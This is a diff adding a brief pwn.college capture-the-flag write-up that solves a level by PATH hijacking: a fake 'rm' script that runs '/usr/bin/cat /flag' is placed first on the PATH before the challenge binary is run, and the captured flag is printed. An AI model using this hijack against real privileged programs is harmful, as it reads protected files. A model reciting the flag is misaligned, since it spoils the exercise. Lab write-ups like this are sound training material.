@@ -1,1 +1,15 @@
 Daymn this is the end.
+
+We make a new directory with `mkdir final` and change directory to final using cd
+Now since the absolute path of cat is /usr/bin/cat you can override rm with it to get the flag.
+
+```
+echo "/usr/bin/cat /flag" > rm
+chmod a+rwx rm
+PATH="~/final"
+/challenge/run
+```
+To get the flag 
+The flag is : 
+>pwn.college{4-c8vQpO7wROrewOKNho2B3A6QX.ddzNyUDL4YjN0czW}
+
